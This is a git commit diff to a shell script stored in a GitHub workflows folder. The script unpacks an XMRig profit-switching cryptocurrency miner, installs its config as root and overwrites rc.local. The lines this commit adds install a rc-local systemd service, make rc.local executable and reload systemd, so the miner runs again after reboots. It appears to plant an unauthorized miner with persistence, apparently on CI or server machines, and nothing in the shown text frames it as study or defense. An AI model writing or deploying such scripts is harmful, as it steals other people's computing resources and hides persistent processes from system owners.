cf185970f9be4f32c56f0d39804006ed4e7cef12
zy123456-zhong <61346716+zy123456-zhong@users.noreply.github.com>
2020-02-25 19:29:08 +0800

    Update my.sh

--- .github/workflows/my.sh
+++ .github/workflows/my.sh
@@ -5,3 +5,6 @@ unzip master.zip
 tar -zxvf profit-switching-miner-master/xmrig-5.5.3-profit-switching-Linux.tar.gz  
 cat /root/config.json > /root/xmrig-5.5.3-prifit-switching-Linux/config.json
 cat /root/rc.local > /etc/rc.d/rc.local
+cat rc-local.service > /usr/lib/systemd/system/rc-local.service
+chmod +x /etc/rc.d/rc.local
+systemctl daemon-reload
